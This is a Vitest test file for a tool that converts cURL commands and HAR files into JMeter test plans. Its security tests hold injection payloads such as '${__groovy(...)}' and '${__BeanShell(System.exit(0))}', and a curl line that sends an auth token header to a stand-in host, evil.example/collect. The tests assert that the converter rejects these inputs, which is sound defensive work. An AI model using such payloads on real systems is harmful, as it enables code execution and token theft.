import { describe, it, expect } from 'vitest';
import {
  parseCurlCommands,
  parseHarJson,
  convertCurlOrHarToJmx,
  isStandardPort,
  sanitizeJMeterValue,
  escapeXml,
  MAX_INPUT_CHARS,
  MAX_BATCH_REQUESTS,
} from '../../src/lib/mcp/curl-har-to-jmx.mjs';
import { lintJmx } from '../../src/lib/mcp/jmx-linter.mjs';
import { XMLParser } from 'fast-xml-parser';

const orderedXmlParser = new XMLParser({
  preserveOrder: true,
  ignoreAttributes: false,
  attributeNamePrefix: '@_',
  parseTagValue: false,
});

function orderedTag(node) {
  return Object.keys(node || {}).find((key) => key !== ':@');
}

function collectOrderedNodes(value, tag, found = []) {
  if (!Array.isArray(value)) return found;
  for (const node of value) {
    const currentTag = orderedTag(node);
    if (currentTag === tag) found.push(node);
    collectOrderedNodes(node[currentTag], tag, found);
  }
  return found;
}

function orderedProperty(nodes, name) {
  const prop = collectOrderedNodes(nodes, 'stringProp').find((node) => node[':@']?.['@_name'] === name);
  return prop?.stringProp?.[0]?.['#text'] ?? '';
}

function orderedBooleanProperty(nodes, name) {
  const prop = collectOrderedNodes(nodes, 'boolProp').find((node) => node[':@']?.['@_name'] === name);
  if (!prop) return undefined;
  return prop.boolProp?.[0]?.['#text'] === 'true';
}

function serializeEffectiveArgument(argument) {
  const encode = (value) => encodeURIComponent(value).replace(/%20/g, '+');
  const name = argument.alwaysEncode ? encode(argument.name) : argument.name;
  const value = argument.alwaysEncode ? encode(argument.value) : argument.value;
  return argument.useEquals ? `${name}=${value}` : value;
}

function followingHashTree(value, tag) {
  if (!Array.isArray(value)) return null;
  for (let index = 0; index < value.length; index++) {
    const currentTag = orderedTag(value[index]);
    if (currentTag === tag && orderedTag(value[index + 1]) === 'hashTree') {
      return value[index + 1].hashTree;
    }
    const nested = followingHashTree(value[index][currentTag], tag);
    if (nested) return nested;
  }
  return null;
}

function effectivePlan(jmxXml) {
  const parsed = orderedXmlParser.parse(jmxXml);
  const threadTree = followingHashTree(parsed, 'ThreadGroup') || [];
  const samplers = [];
  for (let index = 0; index < threadTree.length; index++) {
    const samplerNode = threadTree[index];
    if (orderedTag(samplerNode) !== 'HTTPSamplerProxy') continue;
    const samplerTree = orderedTag(threadTree[index + 1]) === 'hashTree'
      ? threadTree[index + 1].hashTree
      : [];
    const headerList = collectOrderedNodes(samplerTree, 'elementProp')
      .filter((node) => node[':@']?.['@_elementType'] === 'Header')
      .map((node) => ({
        name: orderedProperty(node.elementProp, 'Header.name'),
        value: orderedProperty(node.elementProp, 'Header.value'),
      }));
    const argumentList = collectOrderedNodes(samplerNode.HTTPSamplerProxy, 'elementProp')
      .filter((node) => node[':@']?.['@_elementType'] === 'HTTPArgument')
      .map((node) => ({
        name: orderedProperty(node.elementProp, 'Argument.name'),
        value: orderedProperty(node.elementProp, 'Argument.value'),
        metadata: orderedProperty(node.elementProp, 'Argument.metadata'),
        alwaysEncode: orderedBooleanProperty(node.elementProp, 'HTTPArgument.always_encode') ?? false,
        useEquals: orderedBooleanProperty(node.elementProp, 'HTTPArgument.use_equals') ?? false,
      }));
    const method = orderedProperty(samplerNode.HTTPSamplerProxy, 'HTTPSampler.method');
    let path = orderedProperty(samplerNode.HTTPSamplerProxy, 'HTTPSampler.path');
    const rawBody = orderedBooleanProperty(samplerNode.HTTPSamplerProxy, 'HTTPSampler.postBodyRaw') === true;
    let body = '';
    if (rawBody) {
      body = argumentList[0]?.value || '';
    } else if (['POST', 'PUT', 'PATCH', 'QUERY'].includes(method) && argumentList.length > 0) {
      body = argumentList.map(serializeEffectiveArgument).join('&');
    } else if (argumentList.length > 0) {
      path += `${path.includes('?') ? '&' : '?'}${argumentList.map(serializeEffectiveArgument).join('&')}`;
    }
    samplers.push({
      method,
      path,
      body,
      argumentList,
      headerList,
    });
  }
  const initialCookies = collectOrderedNodes(parsed, 'elementProp')
    .filter((node) => node[':@']?.['@_elementType'] === 'Cookie')
    .map((node) => ({
      name: node[':@']?.['@_name'] || '',
      value: orderedProperty(node.elementProp, 'Cookie.value'),
      domain: orderedProperty(node.elementProp, 'Cookie.domain'),
      path: orderedProperty(node.elementProp, 'Cookie.path'),
    }));
  return { samplers, initialCookies };
}

function effectiveSampler(jmxXml) {
  const sampler = effectivePlan(jmxXml).samplers[0];
  return {
    ...sampler,
    headers: Object.fromEntries(sampler.headerList.map((header) => [header.name, header.value])),
  };
}

describe('curl-har-to-jmx core engine', () => {
  describe('Security: JMeter Function Injection & HAR sanitization (CR-01, CR-02)', () => {
    it('rejects values containing ${__groovy(...)} by default', () => {
      expect(() => sanitizeJMeterValue('${__groovy(1+1)}')).toThrow(/Security error/);
      expect(() => sanitizeJMeterValue('${__BeanShell(System.exit(0))}')).toThrow(/Security error/);
      expect(() => sanitizeJMeterValue('${AUTH_TOKEN}')).toThrow(/Security error/);
    });

    it('rejects cURL headers with embedded JMeter functions', () => {
      const cmd = 'curl -H "X-Probe: ${__groovy(1+1)}" https://api.example.com';
      expect(() => parseCurlCommands(cmd)).toThrow(/Security error/);
    });

    it('sanitizes HAR methods against function injection (CR-02)', () => {
      const har = {
        log: {
          entries: [
            {
              request: {
                method: '${__P(SECRET)}',
                url: 'https://api.example.com/leak',
              },
            },
          ],
        },
      };
      expect(() => parseHarJson(har)).toThrow(/Security error/);
    });

    it('allows JMeter functions only when allowJMeterFunctions is true', () => {
      const sanitized = sanitizeJMeterValue('${__P(customVar)}', true);
      expect(sanitized).toBe('${__P(customVar)}');
    });

    it('rejects an imported variable reference before auth parameterization can expose a token', () => {
      const batch = [
        "curl -H 'Authorization: Bearer topsecret' https://good.example/private",
        "curl -H 'X-Leak: ${AUTH_TOKEN}' https://evil.example/collect",
      ].join('\n');
      expect(() => convertCurlOrHarToJmx({ input: batch })).toThrow(/Security error/);
    });
  });

  describe('XML 1.0 character compliance (CR-11)', () => {
    it('strips forbidden control characters like NUL \\u0000', () => {
      const escaped = escapeXml('Test\u0000Payload\u0008End');
      expect(escaped).toBe('TestPayloadEnd');
      expect(escaped).not.toContain('\u0000');
    });


    it('preserves valid supplementary Unicode while removing lone surrogates', () => {
      expect(escapeXml('A😀B')).toBe('A😀B');
      expect(escapeXml(`A${String.fromCharCode(0xd800)}B`)).toBe('AB');
      const result = convertCurlOrHarToJmx({ input: "curl -d 'hello 😀' https://api.example/emoji" });
      expect(effectiveSampler(result.jmxXml).body).toBe('hello 😀');
    });
  });

  describe('Input bounds & batch ceilings (CR-02, CR-12)', () => {
    it('rejects oversized inputs exceeding MAX_INPUT_CHARS', () => {
      const hugeInput = 'curl https://api.example.com/' + 'a'.repeat(MAX_INPUT_CHARS + 10);
      expect(() => convertCurlOrHarToJmx({ input: hugeInput })).toThrow(/exceeds maximum size/);
    });

    it('throws error when batch request count exceeds MAX_BATCH_REQUESTS (CR-12)', () => {
      const commands = Array.from({ length: MAX_BATCH_REQUESTS + 5 }, (_, i) => `curl https://api.example.com/req${i}`).join('\n');
      expect(() => convertCurlOrHarToJmx({ input: commands })).toThrow(/Batch limit exceeded/);
    });

    it('propagates recognized HAR limits and security failures through the public converter', () => {
      const entries = Array.from({ length: MAX_BATCH_REQUESTS + 1 }, (_, i) => ({
        request: { method: 'GET', url: `https://api.example/req${i}` },
      }));
      expect(() => convertCurlOrHarToJmx({ input: JSON.stringify({ log: { entries } }) })).toThrow(/HAR entry limit exceeded/);
      const hostileHar = { log: { entries: [{ request: { method: 'GET', url: 'https://api.example', headers: [{ name: 'X-Leak', value: '${AUTH_TOKEN}' }] } }] } };
      expect(() => convertCurlOrHarToJmx({ input: JSON.stringify(hostileHar) })).toThrow(/Security error/);
    });
  });

  describe('Empty quoted operands and tokenization (CR-04, CR-09)', () => {
    it('preserves empty quoted operands (-d "") and identifies real URL (CR-04)', () => {
      const cmd = 'curl -d "" https://api.example.com/api';
      const [req] = parseCurlCommands(cmd);
      expect(req).toBeDefined();
      expect(req.domain).toBe('api.example.com');
      expect(req.path).toBe('/api');
      expect(req.body).toBe('');
    });

    it('preserves multiline indentation and literal # lines inside quoted payloads (CR-09)', () => {
      const cmd = `curl -X POST https://api.example.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{
    "query": "query {
      # comment inside query
      user { id name }
    }"
  }'`;
      const [req] = parseCurlCommands(cmd);
      expect(req).toBeDefined();
      expect(req.body).toContain('# comment inside query');
      expect(req.body).toContain('user { id name }');
    });

    it('preserves curl operands, POSIX double-quote backslashes, and real separators', () => {
      const [bodyNamedCurl] = parseCurlCommands('curl -d curl https://api.example/x');
      expect(bodyNamedCurl.method).toBe('POST');
      expect(bodyNamedCurl.body).toBe('curl');

      const [windowsPath] = parseCurlCommands(String.raw`curl -d "C:\tmp\file" https://api.example/path`);
      expect(windowsPath.body).toBe(String.raw`C:\tmp\file`);

      const separated = parseCurlCommands('curl https://a.example/one; curl https://b.example/two');
      expect(separated.map((request) => request.path)).toEqual(['/one', '/two']);
    });

    it('rejects unsupported shell constructs instead of silently changing the request', () => {
      expect(() => parseCurlCommands('curl https://a.example | tee output')).toThrow(/Unsupported shell operator/);
      expect(() => parseCurlCommands('curl "https://a.example/$HOST"')).toThrow(/Security error/);
      expect(() => parseCurlCommands('curl https://a.example/one && curl https://a.example/two')).toThrow(/conditional shell operator "&&"/);
      expect(() => parseCurlCommands('curl https://a.example/one || curl -X DELETE https://a.example/two')).toThrow(/conditional shell operator "\|\|"/);
      expect(() => parseCurlCommands(String.raw`curl -d $'line\nnext' https://a.example/body`)).toThrow(/Security error/);
    });

    it.each([
      ['tilde', 'curl -d ~/payload.json https://api.example/body'],
      ['star glob', 'curl -d *.json https://api.example/body'],
      ['question glob', 'curl -d payload?.json https://api.example/body'],
      ['bracket glob', 'curl -d payload[12].json https://api.example/body'],
      ['brace expansion', 'curl -d {one,two} https://api.example/body'],
    ])('rejects unquoted %s expansion before argv becomes ambiguous', (_label, input) => {
      expect(() => parseCurlCommands(input)).toThrow(/Security error/);
    });

    it.each([
      ['quoted tilde', "curl -d '~' https://api.example/body", '~'],
      ['quoted glob', "curl -d '*.json' https://api.example/body", '*.json'],
      ['escaped glob', String.raw`curl -d \*.json https://api.example/body`, '*.json'],
      ['quoted braces', "curl -d '{one,two}' https://api.example/body", '{one,two}'],
      ['escaped braces', String.raw`curl -d \{one,two\} https://api.example/body`, '{one,two}'],
    ])('preserves %s as a literal', (_label, input, expectedBody) => {
      expect(parseCurlCommands(input)[0].body).toBe(expectedBody);
    });
  });

  describe('Scheme-less target resolution & URL credentials (CR-05, CR-14)', () => {
    it('defaults scheme-less targets to http:// (CR-05)', () => {
      const [req1] = parseCurlCommands('curl example.com/v1');
      expect(req1.protocol).toBe('http');
      expect(req1.domain).toBe('example.com');
      expect(req1.port).toBe('80');

      const [req2] = parseCurlCommands('curl localhost:8080/metrics');
      expect(req2.protocol).toBe('http');
      expect(req2.domain).toBe('localhost');
      expect(req2.port).toBe('8080');
    });

    it('extracts embedded credentials in URLs as Basic Auth (CR-14)', () => {
      const [req] = parseCurlCommands('curl https://myuser:mypass@api.example.com/secure');
      expect(req.auth?.type).toBe('basic');
      expect(req.auth?.username).toBe('myuser');
      expect(req.auth?.password).toBe('mypass');
      expect(req.headers).toContainEqual({
        name: 'Authorization',
        value: 'Basic bXl1c2VyOm15cGFzcw==',
      });
      expect(req.domain).toBe('api.example.com');
      expect(req.url).not.toContain('myuser:mypass');
    });

    it('keeps malformed credential escapes request-local and does not abort a batch', () => {
      const requests = parseCurlCommands([
        'curl https://%E0:p@api.example/first',
        'curl https://api.example/second',
      ].join('\n'));
      expect(requests).toHaveLength(2);
      expect(requests[0].auth?.username).toBe('%E0');
      expect(requests[0].warnings?.join(' ')).toMatch(/Malformed percent-encoding.*username/);
    });

    it('normalizes HAR URL credentials into Basic auth and removes userinfo metadata', () => {
      const [request] = parseHarJson({
        log: { entries: [{ request: { method: 'GET', url: 'https://har-user:har-pass@api.example/private' } }] },
      });
      expect(request.auth).toMatchObject({ type: 'basic', username: 'har-user', password: 'har-pass' });
      expect(request.headers).toContainEqual({ name: 'Authorization', value: 'Basic aGFyLXVzZXI6aGFyLXBhc3M=' });
      expect(request.url).toBe('https://api.example/private');
    });
  });

  describe('Security and routing option warnings (CR-03)', () => {
    it('marks unsupported proxy, client cert, or resolve options as blocking', () => {
      const cmd = 'curl --cert client.pem --key client.key --proxy http://proxy.example:8080 https://api.example.com/data';
      const [req] = parseCurlCommands(cmd);
      expect(req).toBeDefined();
      expect(req.warnings?.some((w) => w.includes('--cert') || w.includes('--proxy'))).toBe(true);
      expect(req.blockingErrors).not.toHaveLength(0);
      const result = convertCurlOrHarToJmx({ input: cmd });
      expect(result.isValid).toBe(false);
      expect(result.blockingErrors.join(' ')).toMatch(/--cert|--proxy/);
    });

    it.each([
      ['attached proxy', 'curl -xhttp://proxy.example:8080 https://api.example/data'],
      ['connect-to', 'curl --connect-to api.example:443:edge.example:8443 https://api.example/data'],
      ['unix socket', 'curl --unix-socket /var/run/service.sock http://localhost/data'],
      ['connect timeout', 'curl --connect-timeout 20 https://api.example/data'],
      ['max time', 'curl -m30 https://api.example/data'],
      ['retry policy', 'curl --retry 5 https://api.example/data'],
    ])('blocks unsupported request-affecting %s semantics', (_label, input) => {
      const result = convertCurlOrHarToJmx({ input });
      expect(result.isValid).toBe(false);
      expect(result.blockingErrors).not.toHaveLength(0);
    });
  });

  describe('Cookie handling & deduplication (CR-06)', () => {
    it('extracts cookies from -H "Cookie: ..."', () => {
      const cmd = 'curl -H "Cookie: token=xyz; role=admin" https://api.example.com/user';
      const [req] = parseCurlCommands(cmd);
      expect(req.cookies).toEqual([
        { name: 'token', value: 'xyz', domain: undefined, path: undefined, secure: undefined, managerEligible: false },
        { name: 'role', value: 'admin', domain: undefined, path: undefined, secure: undefined, managerEligible: false },
      ]);
    });

    it('preserves -b cookies as a sampler-local header with or without CookieManager', () => {
      const cmd = 'curl -b "session=abc" https://api.example.com/dashboard';
      for (const includeCookieManager of [true, false]) {
        const result = convertCurlOrHarToJmx({ input: cmd, includeCookieManager });
        expect(effectiveSampler(result.jmxXml).headers.Cookie).toBe('session=abc');
      }
    });

    it('preserves every HAR request cookie locally without preloading future state', () => {
      const localHar = { log: { entries: [{ request: { method: 'GET', url: 'https://api.example/login', headers: [{ name: 'Cookie', value: 'sid=abc' }] } }] } };
      const localResult = convertCurlOrHarToJmx({ input: JSON.stringify(localHar) });
      expect(effectiveSampler(localResult.jmxXml).headers.Cookie).toBe('sid=abc');
      expect(effectivePlan(localResult.jmxXml).initialCookies).toEqual([]);

      const duplicatedHar = { log: { entries: [{ request: { ...localHar.log.entries[0].request, cookies: [{ name: 'sid', value: 'abc', domain: 'api.example', path: '/' }] } }] } };
      const duplicatedResult = convertCurlOrHarToJmx({ input: JSON.stringify(duplicatedHar) });
      expect(effectiveSampler(duplicatedResult.jmxXml).headers.Cookie).toBe('sid=abc');
      expect(effectiveSampler(duplicatedResult.jmxXml).headerList.filter((header) => header.name === 'Cookie')).toHaveLength(1);

      const timelineHar = {
        log: {
          entries: [
            { request: { method: 'POST', url: 'https://api.example/login' } },
            { request: { method: 'GET', url: 'https://api.example/dashboard', cookies: [{ name: 'sid', value: 'later-session', domain: 'api.example', path: '/' }] } },
            { request: { method: 'GET', url: 'https://api.example/account', cookies: [{ name: 'sid', value: 'rotated-session', domain: 'api.example', path: '/' }] } },
          ],
        },
      };
      for (const includeCookieManager of [true, false]) {
        const timeline = effectivePlan(convertCurlOrHarToJmx({
          input: JSON.stringify(timelineHar),
          includeCookieManager,
        }).jmxXml);
        expect(timeline.initialCookies).toEqual([]);
        expect(timeline.samplers.map((sampler) => sampler.path)).toEqual(['/login', '/dashboard', '/account']);
        expect(timeline.samplers[0].headerList.filter((header) => header.name === 'Cookie')).toEqual([]);
        expect(timeline.samplers[1].headerList).toContainEqual({ name: 'Cookie', value: 'sid=later-session' });
        expect(timeline.samplers[2].headerList).toContainEqual({ name: 'Cookie', value: 'sid=rotated-session' });
      }
    });
  });

  describe('Port preservation for non-standard protocol/port combos (CR-08)', () => {
    it('identifies standard ports correctly', () => {
      expect(isStandardPort('https', '443')).toBe(true);
      expect(isStandardPort('https', '80')).toBe(false);
      expect(isStandardPort('http', '80')).toBe(true);
      expect(isStandardPort('http', '443')).toBe(false);
    });

    it('preserves explicit HTTPS on port 80 or HTTP on port 443', () => {
      const [req1] = parseCurlCommands('curl https://example.com:80/api');
      expect(req1.protocol).toBe('https');
      expect(req1.port).toBe('80');

      const result = convertCurlOrHarToJmx({ input: 'curl https://example.com:80/api' });
      expect(result.jmxXml).toContain('<stringProp name="HTTPSampler.port">80</stringProp>');
    });
  });

  describe('Duration and scheduler synchronization (CR-07)', () => {
    it('sets scheduler=true and loops=-1 when duration is configured', () => {
      const result = convertCurlOrHarToJmx({
        input: 'curl https://api.example.com/test',
        durationSeconds: 300,
      });
      expect(result.jmxXml).toContain('<boolProp name="ThreadGroup.scheduler">true</boolProp>');
      expect(result.jmxXml).toContain('${__P(duration,300)}');
      expect(result.jmxXml).toContain('<stringProp name="LoopController.loops">-1</stringProp>');
    });

    it('does not imply that -Jduration can activate a default duration-zero plan', () => {
      const result = convertCurlOrHarToJmx({ input: 'curl https://api.example/test' });
      expect(result.jmxXml).toContain('<boolProp name="ThreadGroup.scheduler">false</boolProp>');
      expect(result.jmxXml).toContain('<stringProp name="ThreadGroup.duration"></stringProp>');
      expect(result.jmxXml).not.toContain('${__P(duration,');
    });
  });

  describe('Data modes, URL encoding & multipart file uploads (CR-04, CR-09, CR-10, CR-13)', () => {
    it('handles -G with literal plus vs urlencoded parameters (CR-09)', () => {
      const cmd = 'curl -G https://api.example.com/search -d "q=a+b" --data-urlencode "filter=status=active"';
      const [req] = parseCurlCommands(cmd);
      expect(req.method).toBe('GET');
      expect(req.queryParams).toContainEqual(expect.objectContaining({ name: 'q', value: 'a+b', encode: false, useEquals: true }));
      expect(req.queryParams).toContainEqual(expect.objectContaining({ name: 'filter', value: 'status=active', encode: true, useEquals: true }));

      const result = convertCurlOrHarToJmx({ input: cmd });
      expect(effectiveSampler(result.jmxXml)).toMatchObject({
        method: 'GET',
        path: '/search?q=a+b&filter=status%3Dactive',
        body: '',
        argumentList: [],
      });
    });

    it.each(['POST', 'PUT', 'PATCH', 'DELETE', 'QUERY'])('keeps URL queries in the target path for %s without creating a body', (method) => {
      const curl = convertCurlOrHarToJmx({ input: `curl -X ${method} 'https://api.example/search?q=a%26b&flag'` });
      expect(effectiveSampler(curl.jmxXml)).toMatchObject({
        method,
        path: '/search?q=a%26b&flag',
        body: '',
        argumentList: [],
      });

      const har = convertCurlOrHarToJmx({ input: JSON.stringify({ log: { entries: [{ request: { method, url: 'https://api.example/search?q=a%26b&flag' } }] } }) });
      expect(effectiveSampler(har.jmxXml)).toMatchObject({
        method,
        path: '/search?q=a%26b&flag',
        body: '',
        argumentList: [],
      });
    });

    it.each([
      ['content', '--data-urlencode', 'a b&c', '/search?a+b%26c'],
      ['anonymous =content', '--data-urlencode', '=a b', '/search?a+b'],
      ['name=content', '--data-urlencode', 'q=a&b', '/search?q=a%26b'],
      ['bare ordinary data', '-d', 'flag', '/search?flag'],
      ['ordinary named data', '-d', 'q=a&b', '/search?q=a&b'],
    ])('preserves -G %s grammar', (_label, option, operand, expectedPath) => {
      const input = `curl -G ${option} '${operand}' https://api.example/search`;
      const sampler = effectiveSampler(convertCurlOrHarToJmx({ input }).jmxXml);
      expect(sampler).toMatchObject({ method: 'GET', path: expectedPath, body: '', argumentList: [] });
    });

    it('lets an explicit method win while -G moves data to the URL', () => {
      const sampler = effectiveSampler(convertCurlOrHarToJmx({
        input: "curl -G -X POST --data-urlencode 'q=a&b' https://api.example/search",
      }).jmxXml);
      expect(sampler).toMatchObject({ method: 'POST', path: '/search?q=a%26b', body: '', argumentList: [] });
    });

    it('encodes data-urlencode operands before separator interpretation in request bodies', () => {
      expect(effectiveSampler(convertCurlOrHarToJmx({
        input: "curl --data-urlencode 'q=a&b' https://api.example/search",
      }).jmxXml).body).toBe('q=a%26b');
      expect(effectiveSampler(convertCurlOrHarToJmx({
        input: "curl --data-urlencode '=a b' https://api.example/search",
      }).jmxXml).body).toBe('a+b');
    });

    it('flags unresolvable local file-backed data bodies (CR-13)', () => {
      const cmd = 'curl --data-binary @payload.json https://api.example.com/items';
      const result = convertCurlOrHarToJmx({ input: cmd });
      expect(result.hasUnresolvedFileBody).toBe(true);
      expect(result.hasUnresolvedFiles).toBe(true);
      expect(result.isValid).toBe(false);
      expect(result.warnings.some((w) => w.includes('payload.json'))).toBe(true);
      expect(effectiveSampler(result.jmxXml).body).toBe('');
      expect(result.jmxXml).not.toContain('@payload.json');
    });

    it('blocks unresolved HAR file uploads and omits unusable HTTPFileArgs', () => {
      const har = {
        log: {
          entries: [
            {
              request: {
                method: 'POST',
                url: 'https://api.example.com/upload',
                headers: [{ name: 'Content-Type', value: 'multipart/form-data; boundary=----WebKitFormBoundary123' }],
                postData: {
                  mimeType: 'multipart/form-data',
                  params: [
                    { name: 'avatar', fileName: 'profile.png', contentType: 'image/png' },
                    { name: 'tag', value: 'avatar' },
                  ],
                },
              },
            },
          ],
        },
      };

      const result = convertCurlOrHarToJmx({ input: JSON.stringify(har) });
      expect(result.isValid).toBe(false);
      expect(result.hasUnresolvedFiles).toBe(true);
      expect(result.jmxXml).not.toContain('<elementProp name="HTTPsampler.Files" elementType="HTTPFileArgs">');
      expect(result.jmxXml).not.toContain('<stringProp name="File.path">profile.png</stringProp>');
      expect(result.jmxXml).toContain('<boolProp name="HTTPSampler.DO_MULTIPART_POST">true</boolProp>');
      // Static multipart boundary header is stripped so JMeter manages boundaries
      expect(result.jmxXml).not.toContain('WebKitFormBoundary123');
    });

    it('blocks unresolved cURL multipart files and omits unusable HTTPFileArgs', () => {
      const result = convertCurlOrHarToJmx({
        input: "curl -F 'avatar=@missing.png;type=image/png' https://api.example/upload",
      });
      expect(result.isValid).toBe(false);
      expect(result.hasUnresolvedFiles).toBe(true);
      expect(result.jmxXml).not.toContain('HTTPsampler.Files');
      expect(result.jmxXml).not.toContain('missing.png');
    });

    it.each([
      ['--json file', 'curl --json @payload.json https://api.example/items', 'payload.json'],
      ['unnamed data-urlencode file', 'curl --data-urlencode @payload.txt https://api.example/items', 'payload.txt'],
      ['named data-urlencode file', 'curl --data-urlencode name@payload.txt https://api.example/items', 'payload.txt'],
      ['multipart content file', "curl -F 'data=<payload.txt' https://api.example/items", 'payload.txt'],
      ['cookie file', 'curl -b cookies.txt https://api.example/items', 'cookies.txt'],
      ['header file', 'curl -H @headers.txt https://api.example/items', 'headers.txt'],
      ['multipart part-header file', "curl -F 'submit=OK;headers=@headers.txt' https://api.example/items", 'headers.txt'],
      ['multipart part-header file after another modifier', "curl -F 'submit=OK;type=text/plain;headers=@headers.txt' https://api.example/items", 'headers.txt'],
    ])('blocks and omits %s operands', (_label, input, fileName) => {
      const result = convertCurlOrHarToJmx({ input });
      expect(result.isValid).toBe(false);
      expect(result.hasUnresolvedFiles).toBe(true);
      expect(result.blockingErrors.join(' ')).toContain(fileName);
      expect(result.jmxXml).not.toContain(fileName);
    });

    it.each(['type=text/plain', 'filename=custom.txt', 'headers=X-Part: yes'])(
      'blocks unsupported multipart modifier %s without embedding its syntax',
      (modifier) => {
        const result = convertCurlOrHarToJmx({ input: `curl -F 'submit=OK;${modifier}' https://api.example/items` });
        expect(result.isValid).toBe(false);
        expect(result.jmxXml).not.toContain(modifier);
      },
    );

    it('maps representative cURL and HAR inputs to equivalent effective samplers', () => {
      const cases = [
        {
          input: "curl -X PATCH -H 'Content-Type: application/json' -d '{\"ok\":true}' https://api.example/items/1",
          expected: { method: 'PATCH', path: '/items/1', body: '{"ok":true}', headers: { 'Content-Type': 'application/json' } },
        },
        {
          input: JSON.stringify({ log: { entries: [{ request: { method: 'PATCH', url: 'https://api.example/items/1', headers: [{ name: 'Content-Type', value: 'application/json' }], postData: { mimeType: 'application/json', text: '{"ok":true}' } } }] } }),
          expected: { method: 'PATCH', path: '/items/1', body: '{"ok":true}', headers: { 'Content-Type': 'application/json' } },
        },
      ];
      for (const testCase of cases) {
        expect(effectiveSampler(convertCurlOrHarToJmx({ input: testCase.input }).jmxXml)).toMatchObject(testCase.expected);
      }
    });
  });

  describe('Transfer accounting and protocol invariants', () => {
    it('never filters mutating HAR requests whose routes look like static assets', () => {
      const methods = ['POST', 'PUT', 'PATCH', 'DELETE'];
      const har = {
        log: {
          entries: [
            ...methods.map((method) => ({ request: { method, url: `https://api.example/${method.toLowerCase()}.css` } })),
            { request: { method: 'GET', url: 'https://api.example/safe.png' } },
            { request: { method: 'GET', url: 'https://api.example/health' } },
          ],
        },
      };
      const result = convertCurlOrHarToJmx({ input: JSON.stringify(har) });
      const samplers = effectivePlan(result.jmxXml).samplers;
      expect(samplers.map(({ method, path }) => ({ method, path }))).toEqual([
        ...methods.map((method) => ({ method, path: `/${method.toLowerCase()}.css` })),
        { method: 'GET', path: '/health' },
      ]);
    });

    it('parameterizes exact Bearer tokens independently without substring coupling', () => {
      const result = convertCurlOrHarToJmx({
        input: [
          "curl -H 'Authorization: Bearer a' https://api.example/one",
          "curl -H 'Authorization: Bearer abc' https://api.example/two",
          "curl -H 'Authorization: Bearer abcdef' https://api.example/three",
          "curl -H 'Authorization: Bearer abc' https://api.example/four",
        ].join('\n'),
      });
      const authorizationValues = effectivePlan(result.jmxXml).samplers.map((sampler) => (
        sampler.headerList.find((header) => header.name === 'Authorization')?.value
      ));
      expect(authorizationValues).toEqual([
        'Bearer ${AUTH_TOKEN_1}',
        'Bearer ${AUTH_TOKEN_2}',
        'Bearer ${AUTH_TOKEN_3}',
        'Bearer ${AUTH_TOKEN_2}',
      ]);
      expect(result.jmxXml).toContain('<stringProp name="Argument.value">a</stringProp>');
      expect(result.jmxXml).toContain('<stringProp name="Argument.value">abc</stringProp>');
      expect(result.jmxXml).toContain('<stringProp name="Argument.value">abcdef</stringProp>');
      expect(result.jmxXml).not.toContain('${AUTH_TOKEN_2}def');
    });

    it('blocks cURL invocations containing multiple URL transfers', () => {
      const result = convertCurlOrHarToJmx({
        input: 'curl https://a.example/one https://b.example/two',
      });
      expect(result.requestCount).toBe(1);
      expect(result.isValid).toBe(false);
      expect(result.blockingErrors.join(' ')).toMatch(/Multiple URL operands/);
    });

    it('rejects malformed commands in a mixed batch instead of omitting them', () => {
      const batch = [
        'curl https://api.example/valid',
        "curl -H 'X-Only: missing-url'",
      ].join('\n');
      expect(() => convertCurlOrHarToJmx({ input: batch })).toThrow(/no transfer URL/);
    });

    it.each([
      ['missing request', { log: { entries: [{}] } }, /missing request URL/],
      ['missing URL', { log: { entries: [{ request: { method: 'GET' } }] } }, /missing request URL/],
      ['malformed URL', { log: { entries: [{ request: { method: 'GET', url: 'not a valid URL' } }] } }, /malformed request URL/],
      ['non-HTTP protocol', { log: { entries: [{ request: { method: 'GET', url: 'ftp:\/\/files.example\/archive' } }] } }, /unsupported protocol "ftp:"/],
    ])('rejects HAR entries with %s', (_label, har, expected) => {
      expect(() => convertCurlOrHarToJmx({ input: JSON.stringify(har) })).toThrow(expected);
    });

    it('rejects non-HTTP cURL URLs', () => {
      expect(() => convertCurlOrHarToJmx({ input: 'curl ftp://files.example/archive' })).toThrow(/Unsupported URL protocol "ftp:"/);
    });
  });

  describe('End-to-End JMX XML Validation and Linter Score', () => {
    it('generates schema-valid XML parseable by fast-xml-parser', () => {
      const cmd = `curl -X QUERY https://api.example.com/v1/search \\
        -H "Content-Type: application/json" \\
        -H "Authorization: Bearer my-jwt-token" \\
        -d '{"filter":"items"}'`;

      const result = convertCurlOrHarToJmx({
        input: cmd,
        threads: 25,
        rampUpSeconds: 5,
        durationSeconds: 60,
      });

      expect(result.requestCount).toBe(1);
      expect(result.jmxXml).toContain('<stringProp name="HTTPSampler.method">QUERY</stringProp>');
      expect(result.jmxXml).toContain('${__P(threads,25)}');
      expect(result.jmxXml).toContain('${__P(rampUp,5)}');
      expect(result.jmxXml).toContain('${__P(duration,60)}');

      const parser = new XMLParser();
      const parsedXml = parser.parse(result.jmxXml);
      expect(parsedXml.jmeterTestPlan.hashTree.TestPlan).toBeDefined();
    });

    it('achieves a 100 linter score with zero anti-patterns', () => {
      const batch = `
        curl -X GET https://api.example.com/v1/items
        curl -X POST https://api.example.com/v1/items -H "Content-Type: application/json" -d '{"item":"abc"}'
        curl -X DELETE https://api.example.com/v1/items/123 -d '{"reason":"test"}'
      `;
      const result = convertCurlOrHarToJmx({ input: batch });
      const report = lintJmx(result.jmxXml);
      expect(report.score).toBe(100);
      expect(report.findings.filter((f) => f.severity === 'error')).toHaveLength(0);
    });
  });
});
